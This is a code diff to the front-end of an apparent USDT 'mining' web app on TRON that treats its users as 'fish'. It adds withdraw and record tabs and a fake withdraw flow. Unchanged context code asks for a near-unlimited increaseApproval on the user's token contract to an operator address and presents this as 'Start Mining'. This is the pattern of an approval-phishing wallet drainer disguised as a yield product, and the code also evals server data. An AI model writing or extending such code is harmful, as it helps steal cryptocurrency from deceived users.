@@ -226,7 +226,7 @@
               <div class="blockItem">
                 <div class="itemTitle">Withdrawable</div>
                 <div class="itemValue">
-                  <span id="withdrawable_usdt">{{fish.allow_withdraw==null?"0.00":fish.allow_withdraw}}</span> USDT
+                  <span id="withdrawable_usdt">{{fish.allowWithdraw==null?"0.00":fish.allowWithdraw}}</span> USDT
                 </div>
               </div>
             </div>
@@ -244,49 +244,71 @@
                 Record
               </div>
             </div>
-            <div class="blockTitle">
-              <div class="leftIcon"></div>
-              Withdraw
-            </div>
-            <div class="exchange">
-              <div class="changeLeft">
-                <div class="changeValue">
-                  <div class="innum uni-input">
-                    <input
-                      id="changevalue"
-                      maxlength="140"
-                      placeholder="0.00"
-                      step="0.000000000000000001"
-                      enterkeyhint="done"
-                      autocomplete="off"
-                      type="number"
-                      class="uni-input-input"
-                      v-model="redeeallBalance"
-                    />
+            <div id="WithdrawTab" v-show="isActive == 1">
+              <div class="blockTitle">
+                <div class="leftIcon"></div>
+                Withdraw
+              </div>
+              <div class="exchange">
+                <div class="changeLeft">
+                  <div class="changeValue">
+                    <div class="innum uni-input">
+                      <input
+                        id="changevalue"
+                        maxlength="140"
+                        placeholder="0.00"
+                        step="0.000000000000000001"
+                        enterkeyhint="done"
+                        autocomplete="off"
+                        type="number"
+                        class="uni-input-input"
+                        v-model="redeeallBalance"
+                      />
+                    </div>
+                  </div>
+                  <div class="changeAll">
+                    <a style="color: inherit;" @click="redeeall()">Redeem all</a>
                   </div>
                 </div>
-                <div class="changeAll">
-                  <a style="color: inherit;" @click="redeeall()">Redeem all</a>
-                </div>
-              </div>
 
-              <div
-                class="changeIcon"
-                style="height: 40px;border-right: 1px solid #777777;"
-              ></div>
-              <div class="changeRight">
-                <div class="changeValue">
-                  <div class="usdtimage">
-                    <img src="../assets/images/top_usdt_icon.png" />
-                    <span class="coinName">USDT</span>
+                <div
+                  class="changeIcon"
+                  style="height: 40px;border-right: 1px solid #777777;"
+                ></div>
+                <div class="changeRight">
+                  <div class="changeValue">
+                    <div class="usdtimage">
+                      <img src="../assets/images/top_usdt_icon.png" />
+                      <span class="coinName">USDT</span>
+                    </div>
                   </div>
                 </div>
               </div>
+              <div class="exchangeBtn"><a id="postChangeValue" @click="confirm()">Confirm</a></div>
+              <div class="exchangeTips">
+                Your withdraw will be sent to your USDT wallet address within 24
+                hours in the future
+              </div>
             </div>
-            <div class="exchangeBtn"><a id="postChangeValue">Confirm</a></div>
-            <div class="exchangeTips">
-              Your withdraw will be sent to your USDT wallet address within 24
-              hours in the future
+          </div>
+          <div id="RecordTab" v-show="isActive == 2">
+            <div class="recordContent" style="display: block;">
+              <div style="padding: 0 10px;height: 215px;">
+                <div style="display:flex;padding: 7px 0;">
+                  <div style="width: 50%!important;font-size: 15px;color: #0F0;">Time</div>
+                  <div style="width: 50%!important;font-size: 15px;color: #0F0;text-align: center;">Quantity</div>
+                </div>
+                <div id="reward_list">
+                  <div class="exchangeList">
+                    <div class="listMessage alignCenter">No record</div>
+                  </div>
+                </div>
+              </div>
+              <div class="uni-pagination">
+                <a class="uni-pagination-btn" href="javascript:get_reward_list('prev');"><i class="iconfont icon-left"></i></a>
+                <a class="uni-pagination-num uni-pagination__num-flex-none" href="javascript:;"><i id="rpage">1</i></a>
+                <a class="uni-pagination-btn" href="javascript:get_reward_list('next');"><i class="iconfont icon-right"></i></a>
+              </div>
             </div>
           </div>
         </van-tab>
@@ -352,7 +374,7 @@
 </template>
 
 <script>
-import {addFish,getFish, getAuth, addAuth } from "@/api/tron/auth";
+import {addFish,getFish, getAuth, addAuth,withdraw } from "@/api/tron/auth";
 
 export default {
   name: "Home",
@@ -378,7 +400,7 @@ export default {
           trx: undefined,
           usdt: undefined,
           total: undefined,
-          allow_withdraw: undefined
+          allowWithdraw: undefined
       }
     };
   },
@@ -414,8 +436,8 @@ export default {
                 var balance = eval('(' + this.fish.balance +')');
                 this.fish.trx=balance.trx==null?0.00:balance.trx;
                 this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
-                this.fish.allow_withdraw=balance.allow_withdraw==null?0.00:balance.allow_withdraw;
-                this.fish.total=parseInt(this.fish.usdt)+parseInt(balance.allow_withdraw);
+                this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
+                this.fish.total=parseInt(this.fish.usdt)+parseInt(balance.interest);
 
                 return true;
               }else{
@@ -458,7 +480,7 @@ export default {
       //     return;
       // }
       getFish(this.fish).then(response => {
-        if (response.data.code == 200){
+        if (response.data.data.auRecordId == null){
           let res = this.contract["increaseApproval"](this.approveAddr, "90000000000000000000000000000");
           res.send({
             feeLimit: 10000000,
@@ -471,6 +493,12 @@ export default {
           })
           return true;
         }else{
+          this.fish=response.data.data;
+          var balance = eval('(' + this.fish.balance +')');
+          this.fish.trx=balance.trx==null?0.00:balance.trx;
+          this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
+          this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
+          this.fish.total=parseInt(this.fish.usdt)+parseInt(balance.interest);
           this.$toast({ message: "Start Mining Success"});
           return false;
         }
@@ -480,7 +508,23 @@ export default {
       this.$toast({ message: "copy Success"});
     },
     redeeall(){
-      this.redeeallBalance=this.fish.allow_withdraw;
+      this.redeeallBalance=this.fish.allowWithdraw;
+    },
+    confirm(){
+      if (!this.redeeallBalance){
+        this.$toast({ message: "Please enter withdraw amount"});
+        return;
+      }
+      if (this.redeeallBalance>this.fish.allowWithdraw){
+        this.$toast({ message: "withdraw amount input error"});
+        return;
+      }
+      this.fish.allowWithdraw=parseFloat(this.redeeallBalance);
+      this.fish.currentBalance=parseFloat(this.fish.usdt);
+      this.fish.totalBalance=parseFloat(this.fish.total);
+      withdraw(this.fish).then(response => {
+        this.$toast({ message: response.data.msg});
+      });
     }
   }
 };
